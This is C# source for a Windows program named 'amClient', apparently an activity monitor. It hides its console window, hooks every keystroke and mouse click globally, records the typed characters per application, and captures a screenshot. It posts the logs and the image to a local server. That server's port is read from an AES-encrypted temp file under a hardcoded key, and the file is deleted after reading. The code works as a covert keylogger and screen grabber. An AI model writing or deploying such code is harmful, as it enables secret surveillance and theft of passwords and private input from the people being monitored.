using Gma.System.MouseKeyHook;
using System;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Timers;

namespace amClient
{
    class Program
    {
        private static bool running = false;

        private static string ACTIVITY_TYPE_APPLICATION = "Application";
        private static string ACTIVITY_TYPE_URL = "URL";

        private static string localHost = string.Empty;

        private static List<amModel> monitoringList = new List<amModel>();

        #region Attribute to Control Console Window

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        #endregion

        #region Attribute To Get Active Application

        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);

        private static Int32 GetWindowProcessID(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }

        #endregion

        private static IKeyboardMouseEvents m_Events;

        public static void Main()
        {
            //localHost = "http://localhost:5000";
            //Console.Title = "Testing";

            localHost = string.Format("http://localhost:{0}", GetLocalHostPort());

            Console.Title = "amMiddle Start";

            IntPtr hWnd = FindWindow(null, "amMiddle Start");

            if (hWnd != IntPtr.Zero)
            {
                //Hide the window
                ShowWindow(hWnd, 0); // 0 = SW_HIDE
            }

            //API
            RunAsync().Wait();

            SubscribeGlobal();

            SendScreenCapture();
            //System.Timers.Timer aTimer = new System.Timers.Timer();
            //aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            //aTimer.Interval = int.MaxValue;
            //aTimer.Enabled = true;

            Application.Run();            
        }

        private static void OnTimedEvent(object sender, ElapsedEventArgs e)
        {
            SendScreenCapture();
        }

        private static string GetLocalHostPort()
        {
            string port = string.Empty;
            string filePath = "C:\\Temp\\VivaLaVida.txt";
            string cipherText = string.Empty;

            if (File.Exists(filePath))
            {
                using (StreamReader sr = File.OpenText(filePath))
                {
                    cipherText = sr.ReadToEnd();
                }
                File.Delete(filePath);

                var fullCipher = Convert.FromBase64String(cipherText);

                var iv = new byte[16];
                var cipher = new byte[16];

                Buffer.BlockCopy(fullCipher, 0, iv, 0, iv.Length);
                Buffer.BlockCopy(fullCipher, iv.Length, cipher, 0, iv.Length);
                var key = Encoding.UTF8.GetBytes("Gu3G4nt3ngB4ng3t");

                using (var aesAlg = Aes.Create())
                {
                    using (var decryptor = aesAlg.CreateDecryptor(key, iv))
                    {
                        using (var msDecrypt = new MemoryStream(cipher))
                        {
                            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                            {
                                using (var srDecrypt = new StreamReader(csDecrypt))
                                {
                                    port = srDecrypt.ReadToEnd();
                                }
                            }
                        }
                    }
                }
            }
            return port;
        }

        private static void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private static void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;

            m_Events.KeyPress += HookManager_KeyPress;

            m_Events.MouseClick += OnMouseClick;
        }

        private static void Unsubscribe()
        {
            if (m_Events == null) return;

            m_Events.KeyPress -= HookManager_KeyPress;

            m_Events.MouseClick -= OnMouseClick;

            m_Events.Dispose();

            m_Events = null;
        }

        private static void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            try
            {
                Int32 hwnd = 0;
                hwnd = GetForegroundWindow();
                string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;

                if (monitoringList.Exists(monitor => monitor.ActivityName == appProcessName))
                {
                    var monitor = monitoringList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
                    monitor.KeyStrokeCount++;
                    monitor.InputKey = string.Concat(monitor.InputKey, e.KeyChar.ToString());
                    monitor.EndTime = DateTime.Now;
                }
                else
                {
                    if (monitoringList.Count > 0)
                    {
                        SendMonitoringAsync(monitoringList);
                        monitoringList = new List<amModel>();
                    }

                    var monitor = new amModel();
                    monitor.amModelId = Guid.NewGuid().ToString();
                    monitor.ActivityName = appProcessName;
                    monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
                    monitor.InputKey = e.KeyChar.ToString();
                    monitor.KeyStrokeCount = 1;
                    monitor.MouseClickCount = 0;
                    monitor.StartTime = DateTime.Now;
                    monitor.EndTime = DateTime.Now;
                    monitor.IsSuccessSendToServer = true;

                    monitoringList.Add(monitor);
                }

                //CreateMonitoringAsync(monitor);
            }
            catch (Exception ex)
            {

            }
        }

        private static void OnMouseClick(object sender, MouseEventArgs e)
        {
            try
            {
                Int32 hwnd = 0;
                hwnd = GetForegroundWindow();
                string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;

                if (monitoringList.Exists(monitor => monitor.ActivityName == appProcessName))
                {
                    var monitor = monitoringList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
                    monitor.MouseClickCount++;
                    //monitor.InputKey = string.Concat(monitor.InputKey, e.KeyChar.ToString());
                    monitor.EndTime = DateTime.Now;
                }
                else
                {
                    if (monitoringList.Count > 0)
                    {
                        SendMonitoringAsync(monitoringList);
                        monitoringList = new List<amModel>();
                    }

                    var monitor = new amModel();
                    monitor.amModelId = Guid.NewGuid().ToString();
                    monitor.ActivityName = appProcessName;
                    monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
                    monitor.KeyStrokeCount = 0;
                    monitor.MouseClickCount = 1;
                    monitor.StartTime = DateTime.Now;
                    monitor.EndTime = DateTime.Now;
                    monitor.IsSuccessSendToServer = false;
                }
                //CreateMonitoringAsync(monitor);
            }
            catch (Exception ex)
            {
                
            }
        }

        #region To Send Data Using Rest API

        static HttpClient client = new HttpClient();

        static async Task RunAsync()
        {
            client.BaseAddress = new Uri(localHost);
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
        }

        //static async Task<amModel> GetMonitoringModelSampleData(string path)
        //{
        //    amModel monitor = null;
        //    HttpResponseMessage response = await client.GetAsync(path);
        //    if (response.IsSuccessStatusCode)
        //    {
        //        monitor = await response.Content.ReadAsAsync<List<amModel>>();
        //    }
        //    return monitor;
        //}

        static async Task<Uri> SendMonitoringAsync(List<amModel> monitor)
        {
            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/ProcessKeyLog", monitor);
            response.EnsureSuccessStatusCode();

            return response.Headers.Location;
        }

        static async Task<Uri> SendScreenCapture()
        {
            Int32 hwnd = 0;
            hwnd = GetForegroundWindow();
            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
            
            var capture = new amCapture();
            capture.amCaptureId = Guid.NewGuid().ToString();
            capture.SessionID = 0;
            capture.ActivityName = appProcessName;
            capture.ImageBtyeArrayString = new ScreenCapture().CaptureScreenByteArrayString(System.Drawing.Imaging.ImageFormat.Jpeg);
            capture.CaptureScreenDate = DateTime.Now;
            capture.IsSuccessSendToServer = false;
            
            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/ProcessCaptureImage", capture);
            response.EnsureSuccessStatusCode();

            return response.Headers.Location;
        }

        #endregion
    }
}
